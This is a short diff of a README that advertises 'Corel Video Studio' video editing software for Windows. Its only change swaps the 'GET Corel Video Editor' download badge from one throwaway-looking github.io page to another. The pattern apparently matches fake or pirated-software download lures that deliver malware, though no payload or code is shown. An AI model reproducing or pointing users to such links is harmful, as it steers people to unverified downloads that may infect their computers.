@@ -1,6 +1,6 @@
 # Corel Video Studio - Creative Video Editing Software for Windows
 
-[![GET Corel Video Editor](https://img.shields.io/badge/GET%20%E2%80%94%20Corel%20Video%20Editor-0078D6?style=for-the-badge&logoColor=white)](https://brysoncollinscdub.github.io/.github/corel-video-studio)
+[![GET Corel Video Editor](https://img.shields.io/badge/GET%20%E2%80%94%20Corel%20Video%20Editor-0078D6?style=for-the-badge&logoColor=white)](https://denverfriedmanhdwd.github.io/.github/corel-video-studio)
 
 ## Creative Overview for Corel Video Editor
 
